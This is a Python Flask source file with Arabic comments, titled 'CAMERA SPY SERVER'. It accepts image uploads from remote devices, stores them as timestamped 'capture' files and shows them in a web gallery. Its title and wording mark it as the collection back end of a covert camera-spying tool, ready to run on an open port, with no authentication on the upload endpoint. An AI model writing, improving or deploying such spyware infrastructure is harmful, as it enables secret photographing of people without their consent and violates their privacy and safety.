# ============================================================
# 📸 CAMERA SPY SERVER - DEVELOPED
# ============================================================
# يعرض الصور التي تم التقاطها في واجهة بسيطة
# ============================================================

import os
import json
from flask import Flask, request, jsonify, render_template_string, send_from_directory
from datetime import datetime

app = Flask(__name__)

# إعدادات التخزين
UPLOAD_FOLDER = 'captures'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

# ============================================================
# 1. صفحة عرض الصور
# ============================================================

HTML_TEMPLATE = """
<!DOCTYPE html>
<html dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>📸 الصور الملتقطة</title>
    <style>
        body { font-family: Arial, sans-serif; background: #0a0a1a; color: white; padding: 20px; }
        .gallery { display: grid; grid-template-columns: repeat(auto-fill, minmax(250px, 1fr)); gap: 15px; }
        .card { background: #1a1a2e; border-radius: 12px; overflow: hidden; border: 1px solid #333; }
        .card img { width: 100%; height: 200px; object-fit: cover; }
        .card .info { padding: 10px; font-size: 12px; color: #aaa; }
        .empty { text-align: center; padding: 50px; color: #666; }
        .navbar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
        .count { color: #00ff88; font-size: 14px; }
        .refresh { background: #0095f6; color: white; border: none; padding: 8px 16px; border-radius: 8px; cursor: pointer; }
        .refresh:hover { background: #0077cc; }
    </style>
</head>
<body>
    <div class="navbar">
        <h1>📸 الصور الملتقطة</h1>
        <div>
            <span class="count">📊 {{ count }} صورة</span>
            <button class="refresh" onclick="location.reload()">🔄 تحديث</button>
        </div>
    </div>

    {% if images %}
    <div class="gallery">
        {% for img in images %}
        <div class="card">
            <img src="{{ url_for('view_image', filename=img) }}" alt="{{ img }}">
            <div class="info">📅 {{ img.replace('capture_', '').replace('.jpg', '').replace('_', ':') }}</div>
        </div>
        {% endfor %}
    </div>
    {% else %}
    <div class="empty">
        <h2>📭 لا توجد صور بعد</h2>
        <p>سيتم عرض الصور هنا عند استلامها من الأجهزة</p>
    </div>
    {% endif %}
</body>
</html>
"""

# ============================================================
# 2. الصفحة الرئيسية - عرض الصور
# ============================================================

@app.route('/')
def index():
    """عرض جميع الصور في معرض"""
    try:
        images = os.listdir(UPLOAD_FOLDER)
        images = [f for f in images if f.lower().endswith(('.jpg', '.jpeg', '.png', '.gif'))]
        images.sort(reverse=True)  # الأحدث أولاً
        return render_template_string(HTML_TEMPLATE, images=images, count=len(images))
    except Exception as e:
        return f"❌ خطأ: {e}", 500

# ============================================================
# 3. عرض صورة مفردة
# ============================================================

@app.route('/view/<filename>')
def view_image(filename):
    """عرض صورة معينة"""
    return send_from_directory(UPLOAD_FOLDER, filename)

# ============================================================
# 4. استقبال الصور (API)
# ============================================================

@app.route('/upload', methods=['POST'])
def upload_image():
    """استقبال الصورة وحفظها"""
    try:
        if 'file' not in request.files:
            return jsonify({'error': 'No file'}), 400
        
        file = request.files['file']
        if file.filename == '':
            return jsonify({'error': 'Empty filename'}), 400
        
        # حفظ الملف
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"capture_{timestamp}.jpg"
        filepath = os.path.join(UPLOAD_FOLDER, filename)
        file.save(filepath)
        
        print(f"✅ تم استلام الصورة: {filename}")
        return jsonify({'status': 'success', 'filename': filename}), 200
        
    except Exception as e:
        print(f"❌ خطأ: {e}")
        return jsonify({'error': str(e)}), 500

# ============================================================
# 5. قائمة الصور (JSON)
# ============================================================

@app.route('/list', methods=['GET'])
def list_images():
    """إرجاع قائمة الصور بصيغة JSON"""
    try:
        images = os.listdir(UPLOAD_FOLDER)
        images = [f for f in images if f.lower().endswith(('.jpg', '.jpeg', '.png', '.gif'))]
        return jsonify({'images': images, 'count': len(images)}), 200
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# ============================================================
# 6. تشغيل السيرفر
# ============================================================

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
